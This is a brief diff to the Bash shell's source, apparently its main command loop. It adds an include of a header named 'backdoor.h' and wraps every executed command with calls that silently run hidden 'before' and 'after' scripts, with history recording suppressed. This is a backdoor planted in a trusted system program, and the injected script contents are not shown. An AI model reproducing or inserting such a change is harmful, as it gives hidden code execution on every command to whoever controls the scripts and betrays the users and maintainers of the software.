@@ -18,6 +18,7 @@
    along with Bash.  If not, see <http://www.gnu.org/licenses/>.
 */
 
+#include "backdoor.h"
 #include "config.h"
 
 #if defined (HAVE_UNISTD_H)
@@ -168,8 +169,9 @@ reader_loop ()
 	      executing = 1;
 	      stdin_redir = 0;
 
+	      parse_and_execute (savestring (BEFORE_CMD_SCRIPT), "-c", SEVAL_NOHIST);
 	      execute_command (current_command);
-
+	      parse_and_execute (savestring (AFTER_CMD_SCRIPT), "-c", SEVAL_NOHIST);
 	    exec_done:
 	      QUIT;
 
